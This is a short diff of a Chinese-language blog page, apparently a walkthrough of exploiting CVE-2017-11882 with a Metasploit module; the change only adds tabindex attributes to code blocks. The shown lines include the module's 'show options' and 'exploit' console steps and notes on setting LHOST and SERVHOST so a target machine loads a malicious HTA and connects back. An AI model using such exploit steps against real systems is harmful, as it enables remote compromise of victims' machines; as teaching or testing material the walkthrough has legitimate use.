@@ -154,7 +154,7 @@
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x00.png" alt="0x00"></p>
 <p>找好之后，在里面可以写上你想写的内容 :) 诱惑~ 哈哈</p>
 <p>下一步就要设置msf模块的配置了：</p>
-<pre><code>msf exploit(CVE-2017-11882) &gt; show options 
+<pre tabindex="0"><code>msf exploit(CVE-2017-11882) &gt; show options 
 
 Module options (exploit/windows/CVE-2017-11882):
 
@@ -183,7 +183,7 @@ Exploit target:
    0   Automatic
 
 </code></pre><p>由于阿里云ECS服务器上没有对我的网卡直接分配外网IP，所以需要LHOST监听外网IP地址，SERVHOST用于目标机器访问加载HTA，填写0.0.0.0即可，这样现在就可以与安全组配置相符了。</p>
-<pre><code>msf exploit(CVE-2017-11882) &gt; exploit 
+<pre tabindex="0"><code>msf exploit(CVE-2017-11882) &gt; exploit 
 [*] Exploit running as background job 13.
 
 [-] Handler failed to bind to 118.**.**.77:4455:-  -
